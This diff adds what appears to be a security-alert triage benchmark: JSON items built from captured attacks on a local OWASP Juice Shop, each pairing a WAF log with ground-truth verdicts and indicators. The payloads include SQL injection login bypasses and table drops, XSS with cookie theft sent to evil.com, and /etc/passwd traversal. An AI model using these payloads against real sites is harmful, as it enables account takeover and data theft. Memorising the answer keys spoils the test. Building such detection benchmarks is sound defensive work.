@@ -1,0 +1,2793 @@
+{
+  "version": "1.0",
+  "generated": "2026-03-21T14:37:33Z",
+  "source": "OWASP Juice Shop (live attack capture)",
+  "target": "http://localhost:3001",
+  "total": 100,
+  "true_positive": 70,
+  "benign": 30,
+  "categories": {
+    "SQL Injection (15)": 15,
+    "XSS (10)": 10,
+    "Path Traversal (10)": 10,
+    "Broken Auth (10)": 10,
+    "IDOR (10)": 10,
+    "SSRF (5)": 5,
+    "File Upload (5)": 5,
+    "Command Injection (5)": 5,
+    "Benign Logins (10)": 10,
+    "Benign Browsing (10)": 10,
+    "Benign API Calls (10)": 10
+  },
+  "alerts": [
+    {
+      "id": 1,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: ' OR 1=1--",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_classic-or-bypass",
+        "source_ip": "10.0.4.21",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_classic-or-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 200 | Body: {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR 1=1--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 2,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: admin'--",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_admin-comment-bypass",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_admin-comment-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin'--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 3,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: ' UNION SELECT 1,2,3--",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_union-login",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_union-login",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' UNION SELECT 1,2,3--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 4,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: ' OR ''='",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_empty-string-bypass",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_empty-string-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 401 | Body: Invalid email or password."
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR ''='",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 5,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: ') OR ('1'='1",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_paren-bypass",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_paren-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "') OR ('1'='1",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 6,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: admin@juice-sh.op'--",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_email-comment-bypass",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_email-comment-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 200 | Body: {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op'--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 7,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection login bypass attempt: ' OR 1=1; --",
+      "siem_event": {
+        "title": "WAF_SQLi_Login_semicolon-bypass",
+        "source_ip": "10.0.3.15",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Login_semicolon-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "POST /rest/user/login HTTP/1.1 | Status: 200 | Body: {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR 1=1; --",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 8,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection in product search: ' OR 1=1--",
+      "siem_event": {
+        "title": "WAF_SQLi_Search_search-or-bypass",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Search_search-or-bypass",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "GET /rest/products/search?q=' OR 1=1-- HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: incomplete input</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradient(linear, 0% 0%,"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR 1=1--"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 9,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection in product search: '; DROP TABLE Products;--",
+      "siem_event": {
+        "title": "WAF_SQLi_Search_search-drop-table",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Search_search-drop-table",
+        "timestamp": "2026-03-21T14:37:26Z",
+        "raw_log": "GET /rest/products/search?q='; DROP TABLE Products;-- HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;;&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradien"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "'; DROP TABLE Products;--"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 10,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection in product search: ' UNION SELECT id,email,password,4,5,6,7,8,9 FROM ",
+      "siem_event": {
+        "title": "WAF_SQLi_Search_search-union-users",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Search_search-union-users",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=' UNION SELECT id,email,passwo HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gra"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' UNION SELECT id,email,password,4,5,6,7,8,9 FROM "
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 11,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection in product search: ')) OR 1=1--",
+      "siem_event": {
+        "title": "WAF_SQLi_Search_search-double-paren",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Search_search-double-paren",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=')) OR 1=1-- HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":2,\"name\":\"Orange Juice ("
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "')) OR 1=1--"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 12,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection in product search: ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM ",
+      "siem_event": {
+        "title": "WAF_SQLi_Search_search-error-based",
+        "source_ip": "10.0.2.101",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_Search_search-error-based",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=' AND 1=CONVERT(int,(SELECT TO HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;1&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradien"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM "
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 13,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection via order-by parameter",
+      "siem_event": {
+        "title": "WAF_SQLi_OrderBy_orderby-case",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_OrderBy_orderby-case",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=juice HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":6,\"name\":\"Banana Juice ( | X-Sort: name,(CASE WHEN (1=1) THEN name ELSE price END)"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "name,(CASE WHEN (1=1) THEN name ELSE price END)"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 14,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection via order-by parameter",
+      "siem_event": {
+        "title": "WAF_SQLi_OrderBy_orderby-drop",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_OrderBy_orderby-drop",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=juice HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":6,\"name\":\"Banana Juice ( | X-Sort: name; DROP TABLE Users--"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "name; DROP TABLE Users--"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 15,
+      "task_type": "data_exfiltration",
+      "severity": "critical",
+      "prompt": "Investigate SQL injection via order-by parameter",
+      "siem_event": {
+        "title": "WAF_SQLi_OrderBy_orderby-subquery",
+        "source_ip": "10.0.4.21",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_SQLi_OrderBy_orderby-subquery",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=juice HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-03-21 14:32:44.317 +00:00\",\"updatedAt\":\"2026-03-21 14:32:44.317 +00:00\",\"deletedAt\":null},{\"id\":6,\"name\":\"Banana Juice ( | X-Sort: price DESC, (SELECT password FROM Users LIMIT 1)"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "price DESC, (SELECT password FROM Users LIMIT 1)"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 16,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: script tag",
+      "siem_event": {
+        "title": "WAF_XSS_script-tag",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_script-tag",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=<script>alert('XSS')</script> HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;XSS&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradi"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<script>alert('XSS')</script>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 17,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: img onerror",
+      "siem_event": {
+        "title": "WAF_XSS_img-onerror",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_img-onerror",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=<img src=x onerror=alert(1)> HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[]}"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<img src=x onerror=alert(1)>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 18,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: svg onload",
+      "siem_event": {
+        "title": "WAF_XSS_svg-onload",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_svg-onload",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=<svg onload=alert(document.cookie)> HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[]}"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<svg onload=alert(document.cookie)>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 19,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: iframe js",
+      "siem_event": {
+        "title": "WAF_XSS_iframe-js",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_iframe-js",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=<iframe src='javascript:alert(1)'> HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;javascript&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webki"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<iframe src='javascript:alert(1)'>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 20,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: template inject",
+      "siem_event": {
+        "title": "WAF_XSS_template-inject",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_template-inject",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q={{constructor.constructor('alert(1)')()} HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;alert&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gra"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "{{constructor.constructor('alert(1)')()}}"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 21,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: body onload",
+      "siem_event": {
+        "title": "WAF_XSS_body-onload",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_body-onload",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=<body onload=alert('XSS')> HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;XSS&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-gradi"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<body onload=alert('XSS')>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "easy"
+      }
+    },
+    {
+      "id": 22,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: cookie steal",
+      "siem_event": {
+        "title": "WAF_XSS_cookie-steal",
+        "source_ip": "10.0.4.21",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_cookie-steal",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=\"><script>document.location='http://evil HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;http&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-grad"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "\"><script>document.location='http://evil.com/steal?c='+docum"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 23,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: stored feedback",
+      "siem_event": {
+        "title": "WAF_XSS_stored-feedback",
+        "source_ip": "10.0.1.51",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_stored-feedback",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=<script>new Image().src='http://evil.com HTTP/1.1 | Status: 500 | Body: <html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;http&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";   background: #ECE9E9 -webkit-grad"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<script>new Image().src='http://evil.com/'+document.cookie</"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 24,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: url encoded",
+      "siem_event": {
+        "title": "WAF_XSS_url-encoded",
+        "source_ip": "10.0.2.100",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_url-encoded",
+        "timestamp": "2026-03-21T14:37:27Z",
+        "raw_log": "GET /rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[]}"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "%3Cscript%3Ealert(1)%3C/script%3E"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 25,
+      "task_type": "phishing",
+      "severity": "high",
+      "prompt": "Investigate XSS attempt in product search: js protocol",
+      "siem_event": {
+        "title": "WAF_XSS_js-protocol",
+        "source_ip": "10.0.4.20",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_XSS_js-protocol",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /rest/products/search?q=javascript:alert(document.domain) HTTP/1.1 | Status: 200 | Body: {\"status\":\"success\",\"data\":[]}"
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "javascript:alert(document.domain)"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      }
+    },
+    {
+      "id": 26,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /ftp/package.json.bak%2500.md",
+      "siem_event": {
+        "title": "WAF_PathTraversal_null-byte-ftp",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_null-byte-ftp",
+        "timestamp": "2026-03-21T14:37:28Z",
+        "raw_log": "GET /ftp/package.json.bak%2500.md HTTP/1.1 | Status: 200 | Body: {   \"name\": \"juice-shop\",   \"version\": \"6.2.0-SNAPSHOT\",   \"description\": \"An intentionally insecure JavaScript Web Application\",   \"homepage\": \"http://owasp-juice.shop\",   \"author\": \"Björn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.de)\",   \"contributors\": [     \"Björn Kimminich\",    "
+      },
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "package.json.bak"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "hard"
+      }
+    },
+    {
+      "id": 27,
+      "task_type": "data_exfiltration",
+      "severity": "high",
+      "prompt": "Investigate path traversal attempt to access /../../../etc/passwd",
+      "siem_event": {
+        "title": "WAF_PathTraversal_etc-passwd",
+        "source_ip": "10.0.3.16",
+        "destination_ip": "172.17.0.5",
+        "hostname": "JUICE-SHOP-01",
+        "username": "attacker",
+        "rule_name": "WAF_PathTraversal_etc-passwd",
